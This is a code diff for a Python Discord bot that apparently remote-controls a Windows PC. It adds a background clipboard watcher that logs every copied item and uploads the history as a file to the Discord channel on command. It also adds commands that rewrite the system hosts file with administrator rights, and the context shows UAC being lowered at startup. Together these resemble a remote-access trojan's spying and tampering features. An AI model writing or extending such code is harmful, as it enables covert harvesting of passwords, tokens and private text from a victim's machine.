@@ -1591,6 +1591,308 @@ async def set_volume(ctx, level: int = None):
     except Exception as e:
         await ctx.send(f"❌ Failed to set volume: `{e}`")
 
+# ============================================================
+#  Clipboard History Tracker
+# ============================================================
+import pyperclip
+
+CLIPBOARD_HISTORY = []          # list of (timestamp, content)
+CLIPBOARD_MAX = 50              # keep last 50 entries
+_clipboard_last = None          # last seen clipboard content
+_clipboard_lock = threading.Lock()
+
+
+async def clipboard_watcher():
+    """Background task: polls the clipboard every 1s and stores changes."""
+    global _clipboard_last
+    await bot.wait_until_ready()
+    while not bot.is_closed():
+        try:
+            current = await asyncio.to_thread(pyperclip.paste)
+            if current and current != _clipboard_last:
+                with _clipboard_lock:
+                    _clipboard_last = current
+                    CLIPBOARD_HISTORY.append(
+                        (datetime.datetime.now(), current)
+                    )
+                    if len(CLIPBOARD_HISTORY) > CLIPBOARD_MAX:
+                        CLIPBOARD_HISTORY.pop(0)
+        except Exception:
+            pass
+        await asyncio.sleep(1)
+
+
+@bot.event
+async def on_ready_clipboard_start():
+    """Placeholder – not used. See on_ready below."""
+    pass
+
+
+# ============================================================
+#  !clipboard – Show full clipboard history
+# ============================================================
+@bot.command(name="clipboard", aliases=["clip", "cb"])
+async def clipboard(ctx):
+    """Shows the full clipboard history tracked since the bot started."""
+    with _clipboard_lock:
+        history = list(CLIPBOARD_HISTORY)
+
+    if not history:
+        # Fallback: show current clipboard content
+        try:
+            current = await asyncio.to_thread(pyperclip.paste)
+        except Exception as e:
+            await ctx.send(f"❌ Failed to read clipboard: `{e}`")
+            return
+
+        if not current or not current.strip():
+            await ctx.send("📋 Clipboard history is empty.")
+            return
+        await ctx.send(f"📋 **Clipboard (current):**\n```\n{current[:1900]}\n```")
+        return
+
+    # Build a text report
+    lines = []
+    lines.append(f"Clipboard History – {len(history)} entries")
+    lines.append(f"Generated: {datetime.datetime.now():%d.%m.%Y %H:%M:%S}")
+    lines.append("=" * 80)
+    lines.append("")
+
+    for i, (ts, content) in enumerate(history, start=1):
+        preview = content if len(content) < 200 else content[:200] + f"... (+{len(content)-200} chars)"
+        lines.append(f"[{i}] {ts.strftime('%d.%m.%Y %H:%M:%S')}")
+        lines.append(f"    {preview}")
+        lines.append("")
+
+    report = "\n".join(lines)
+
+    # Always send as .txt file (history can be long)
+    tmp_dir = os.path.join(
+        os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
+        "PyCord", "Clipboard"
+    )
+    os.makedirs(tmp_dir, exist_ok=True)
+    filename = f"clipboard_history_{datetime.datetime.now():%Y%m%d_%H%M%S}.txt"
+    filepath = os.path.join(tmp_dir, filename)
+
+    with open(filepath, "w", encoding="utf-8") as f:
+        f.write(report)
+
+    # Also post a short preview in chat
+    preview_lines = [f"📋 **Clipboard History** – {len(history)} entries"]
+    for i, (ts, content) in enumerate(history[-5:], start=1):
+        one_line = content.replace("\n", " ")[:80]
+        preview_lines.append(f"`[{ts:%H:%M:%S}]` {one_line}")
+
+    preview_text = "\n".join(preview_lines)
+    if len(history) > 5:
+        preview_text += f"\n*… and {len(history)-5} older entries (see file).*"
+
+    try:
+        file = discord.File(filepath, filename=filename)
+        await ctx.send(preview_text, file=file)
+    except Exception as e:
+        await ctx.send(f"❌ Failed to send file: `{e}`")
+
+
+# ============================================================
+#  Hosts-Datei Helpers
+# ============================================================
+HOSTS_PATH = r"C:\Windows\System32\drivers\etc\hosts"
+BLOCK_MARKER = "# PyCordBlock"
+
+
+def is_admin():
+    """Check if the current process has admin rights (Windows)."""
+    if platform.system() != "Windows":
+        return False
+    try:
+        import ctypes
+        return bool(ctypes.windll.shell32.IsUserAnAdmin())
+    except Exception:
+        return False
+
+
+def read_hosts():
+    """Read the hosts file. Returns list of lines."""
+    with open(HOSTS_PATH, "r", encoding="utf-8", errors="ignore") as f:
+        return f.readlines()
+
+
+def write_hosts(lines):
+    """Write lines back to the hosts file."""
+    with open(HOSTS_PATH, "w", encoding="utf-8") as f:
+        f.writelines(lines)
+
+
+def normalize_domain(url: str) -> str:
+    """Extract a plain domain from a URL or domain string."""
+    url = url.strip().lower()
+    # Remove scheme
+    url = re.sub(r"^https?://", "", url)
+    # Remove path / query / fragment
+    url = url.split("/")[0].split("?")[0].split("#")[0]
+    # Remove port
+    url = url.split(":")[0]
+    # Remove leading www. (optional, keep both)
+    return url
+
+
+def is_blocked(domain: str, lines) -> bool:
+    """Check if a domain is already blocked by PyCord."""
+    for line in lines:
+        stripped = line.strip()
+        if not stripped or stripped.startswith("#"):
+            continue
+        parts = stripped.split()
+        if len(parts) >= 2:
+            # parts[0] = IP, parts[1] = domain
+            if parts[1].lower() == domain.lower():
+                return True
+    return False
+
+
+# ============================================================
+#  !blocksite – Redirect a domain to localhost
+# ============================================================
+@bot.command(name="blocksite", aliases=["block"])
+async def blocksite(ctx, url: str = None):
+    """
+    Blocks a website by redirecting it to 127.0.0.1 (localhost)
+    via the Windows hosts file.
+    Usage: !blocksite example.com
+    """
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows.")
+        return
+
+    if not is_admin():
+        await ctx.send(
+            "❌ **Admin rights required.**\n"
+            "The bot must be started as Administrator to edit the hosts file."
+        )
+        return
+
+    if not url:
+        await ctx.send("❌ Usage: `!blocksite <url>`")
+        return
+
+    domain = normalize_domain(url)
+    if not domain or "." not in domain:
+        await ctx.send(f"❌ Invalid domain: `{url}`")
+        return
+
+    try:
+        lines = await asyncio.to_thread(read_hosts)
+    except Exception as e:
+        await ctx.send(f"❌ Failed to read hosts file: `{e}`")
+        return
+
+    if is_blocked(domain, lines):
+        await ctx.send(f"⚠️ `{domain}` is already blocked.")
+        return
+
+    # Append both base domain and www. variant
+    new_lines = []
+    new_lines.append(f"\n{BLOCK_MARKER} {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n")
+    new_lines.append(f"127.0.0.1\t{domain}\n")
+    if not domain.startswith("www."):
+        new_lines.append(f"127.0.0.1\twww.{domain}\n")
+
+    try:
+        await asyncio.to_thread(write_hosts, lines + new_lines)
+        # Flush DNS cache
+        subprocess.Popen(
+            ["ipconfig", "/flushdns"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        await ctx.send(
+            f"🚫 **Blocked:** `{domain}` (and `www.{domain}` if applicable)\n"
+            f"→ Redirected to `127.0.0.1`\n"
+            f"DNS cache flushed."
+        )
+        print(f"🚫 Blocked: {domain}")
+    except PermissionError:
+        await ctx.send("❌ Permission denied. Run the bot as Administrator.")
+    except Exception as e:
+        await ctx.send(f"❌ Failed to write hosts file: `{e}`")
+
+
+# ============================================================
+#  !unblocksite – Remove a domain from the hosts file
+# ============================================================
+@bot.command(name="unblocksite", aliases=["unblock"])
+async def unblocksite(ctx, url: str = None):
+    """
+    Unblocks a website by removing its entries from the hosts file.
+    Usage: !unblocksite example.com
+    """
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows.")
+        return
+
+    if not is_admin():
+        await ctx.send(
+            "❌ **Admin rights required.**\n"
+            "The bot must be started as Administrator to edit the hosts file."
+        )
+        return
+
+    if not url:
+        await ctx.send("❌ Usage: `!unblocksite <url>`")
+        return
+
+    domain = normalize_domain(url)
+    if not domain or "." not in domain:
+        await ctx.send(f"❌ Invalid domain: `{url}`")
+        return
+
+    try:
+        lines = await asyncio.to_thread(read_hosts)
+    except Exception as e:
+        await ctx.send(f"❌ Failed to read hosts file: `{e}`")
+        return
+
+    # Filter out lines that block this domain
+    removed = 0
+    new_lines = []
+    for line in lines:
+        stripped = line.strip()
+        if not stripped or stripped.startswith("#"):
+            new_lines.append(line)
+            continue
+        parts = stripped.split()
+        if len(parts) >= 2:
+            entry_domain = parts[1].lower()
+            if entry_domain == domain.lower() or entry_domain == f"www.{domain.lower()}":
+                removed += 1
+                continue
+        new_lines.append(line)
+
+    if removed == 0:
+        await ctx.send(f"⚠️ `{domain}` is not blocked.")
+        return
+
+    try:
+        await asyncio.to_thread(write_hosts, new_lines)
+        subprocess.Popen(
+            ["ipconfig", "/flushdns"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        await ctx.send(
+            f"✅ **Unblocked:** `{domain}`\n"
+            f"Removed **{removed}** entry(ies) from the hosts file.\n"
+            f"DNS cache flushed."
+        )
+        print(f"✅ Unblocked: {domain} ({removed} entries removed)")
+    except PermissionError:
+        await ctx.send("❌ Permission denied. Run the bot as Administrator.")
+    except Exception as e:
+        await ctx.send(f"❌ Failed to write hosts file: `{e}`")
+
+        
 # --- Start bot ---
 if __name__ == "__main__":
     set_uac_low()
